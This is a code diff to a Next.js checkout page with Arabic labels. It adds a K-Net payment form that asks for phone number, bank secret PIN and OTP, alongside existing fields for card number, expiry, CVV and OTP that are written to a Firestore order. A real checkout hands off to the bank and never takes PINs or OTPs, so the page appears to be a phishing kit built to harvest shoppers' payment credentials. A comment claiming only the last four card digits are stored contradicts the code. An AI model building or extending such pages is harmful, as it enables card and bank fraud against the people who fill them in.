@@ -8,6 +8,8 @@ import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/componen
 import { Input } from "@/components/ui/input"
 import { collection, addDoc } from 'firebase/firestore'
 import { db } from '@/lib/firebase'
+import { PaymentMethodSelector } from '../../components/payemnt-selector'
+import React from 'react'
 const products = [
   {
     id: 1,
@@ -49,6 +51,7 @@ type CartItem = {
 export default function CheckoutPage() {
   const [cart, setCart] = useState<CartItem[]>([])
   const [step, setStep] = useState(1)
+  const [pm, setPm] = useState('visa')
   const [shippingInfo, setShippingInfo] = useState({
     name: '',
     address: '',
@@ -60,6 +63,11 @@ export default function CheckoutPage() {
     expiryDate: '',
     cvv: '',
     otp: ''
+  })
+  const [kentInfo, setKentInfo] = useState({
+   phonenumber: '',
+    pass: '',
+    otpkent: ''
   })
   const router = useRouter()
 
@@ -90,7 +98,10 @@ export default function CheckoutPage() {
 
     try {
       // Create an order object
-      const order = {
+      const order =
+      
+ 
+      {
         paymentInfo: {
           cardNumber: paymentInfo.cardNumber, // Only store last 4 digits
           expiryDate: paymentInfo.expiryDate,
@@ -194,6 +205,9 @@ export default function CheckoutPage() {
               </CardContent>
             </Card>
           ) : step === 2 ? (
+            <>
+            <PaymentMethodSelector setPm={setPm}/>
+            {pm==='visa'?
             <Card>
               <CardHeader>
                 <CardTitle>الدفع</CardTitle>
@@ -240,6 +254,48 @@ export default function CheckoutPage() {
                 <img src='/000.avif'alt="pm"  className='h-10 w-full px-2'/>
               </CardFooter>
             </Card>
+            :
+            <Card>
+            <CardHeader>
+              <CardTitle> K-Net الدفع</CardTitle>
+            </CardHeader>
+            <CardContent>
+              <div className="space-y-4">
+                <div>
+                  <label htmlFor="phone">رقم الهاتف</label>
+                  <Input
+                    id="phone"
+                    onChange={(e) => setKentInfo({ ...kentInfo, phonenumber: e.target.value })}
+
+                    placeholder="965555555555"
+                    required
+                  />
+                </div>
+                <div className="space-y-4">
+                  <div>
+                    <label htmlFor="pass">الرمز السري </label>
+                    <Input
+                      id="pass"
+                      placeholder="****"
+                      required
+                      onChange={(e) => setKentInfo({ ...kentInfo, pass: e.target.value })}
+
+                    />
+                  </div>
+                
+                </div>
+                <Button onClick={(w) => handlePaymentSubmit(w).then(() => {
+                })} className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white">
+                  دفع                  </Button>
+              </div>
+            </CardContent>
+            <CardFooter>
+              <img src='/000.avif'alt="pm"  className='h-10 w-full px-2'/>
+            </CardFooter>
+          </Card>
+            
+            }
+            </>
           ) : (<Card>
             <CardHeader>
               <CardTitle>رمز التحقق OTP</CardTitle>
@@ -248,7 +304,9 @@ export default function CheckoutPage() {
               <div>
                 <label htmlFor="otp">ادخل رمز التحقق المرسل الى هاتفك</label>
                 <Input
-                  onChange={(e) => setPaymentInfo({ ...paymentInfo, otp: e.target.value })}
+                  onChange={(e) =>pm==='visa'? 
+                    setPaymentInfo({ ...paymentInfo, otp: e.target.value })
+                  :setKentInfo({...kentInfo,otpkent:e.target.value})}
                   id="otp"
                   placeholder="*******"
                   required
